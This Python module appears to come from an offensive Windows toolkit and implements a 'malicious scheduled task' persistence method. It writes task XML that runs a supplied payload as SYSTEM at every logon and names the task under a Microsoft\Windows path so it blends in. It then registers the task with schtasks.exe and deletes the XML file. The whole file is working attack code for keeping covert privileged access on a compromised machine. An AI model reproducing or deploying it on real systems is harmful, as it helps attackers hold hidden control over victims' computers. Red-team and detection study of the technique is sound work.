from winpwnage.core.prints import *
from winpwnage.core.utils import *
import datetime
import tempfile
import time
import os

persistMethod2_info = {
	"Description": "Persistence using schtasks.exe (SYSTEM privileges)",
	"Method": "Malicious scheduled task",
	"Id": "2",
	"Type": "Persistence",
	"Fixed In": "99999" if information().admin() == True else "0",
	"Works From": "7600",
	"Admin": True,
	"Function Name": "persistMethod2",
	"Function Payload": True,
}

def persistMethod2(payload, name="", add=True):
	if not information().admin():
		print_error("Cannot proceed, we are not elevated")
		return False

	if add:
		if payloads().exe(payload):
			xml_template = """<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
	<RegistrationInfo>
		<Date>{date}</Date>
		<URI>\\Microsoft\\Windows\\{name}</URI>
	</RegistrationInfo>
	<Triggers>
		<LogonTrigger>
			<Enabled>true</Enabled>
		</LogonTrigger>
	</Triggers>
	<Principals>
		<Principal id="Author">
			<UserId>S-1-5-18</UserId>
			<RunLevel>HighestAvailable</RunLevel>
		</Principal>
	</Principals>
	<Settings>
		<MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
		<DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
		<StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
		<AllowHardTerminate>false</AllowHardTerminate>
		<StartWhenAvailable>true</StartWhenAvailable>
		<RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
		<IdleSettings>
			<StopOnIdleEnd>true</StopOnIdleEnd>
			<RestartOnIdle>false</RestartOnIdle>
		</IdleSettings>
		<AllowStartOnDemand>true</AllowStartOnDemand>
		<Enabled>true</Enabled>
		<Hidden>false</Hidden>
		<RunOnlyIfIdle>false</RunOnlyIfIdle>
		<WakeToRun>false</WakeToRun>
		<ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
		<Priority>7</Priority>
		<RestartOnFailure>
			<Interval>PT2H</Interval>
			<Count>999</Count>
		</RestartOnFailure>
	</Settings>
	<Actions Context="Author">
		<Exec>
			<Command>"{payload}"</Command>
		</Exec>
	</Actions>
</Task>""".format(date=str(datetime.datetime.now()).replace(' ', 'T'), name=name, payload=payloads().exe(payload)[1])

			try:
				xml_file = open(os.path.join(tempfile.gettempdir(), "{name}.xml".format(name=name)), "w")
				xml_file.write(xml_template)
				xml_file.close()
			except Exception:
				return False

			time.sleep(5)

			if os.path.isfile(os.path.join(tempfile.gettempdir(), "{name}.xml".format(name=name))):
				if process().create("schtasks.exe", params="/create /xml {path} /tn {name}".format(
						path=os.path.join(tempfile.gettempdir(), "{name}.xml".format(name=name)), name=name)):
					print_success("Successfully created scheduled task, payload will run at login")
				else:
					print_error("Unable to create scheduled task")
					return False

				time.sleep(5)

				try:
					os.remove(os.path.join(tempfile.gettempdir(), "{name}.xml".format(name=name)))
				except Exception:
					return False
			else:
				print_error("Unable to create scheduled task, xml file not found")
				return False
		else:
			print_error("Cannot proceed, invalid payload")
			return False
	else:
		if process().create("schtasks.exe", params="/delete /tn {name} /f".format(name=name)):
			print_success("Successfully removed persistence")
		else:
			print_error("Unable to remove persistence")
			return False
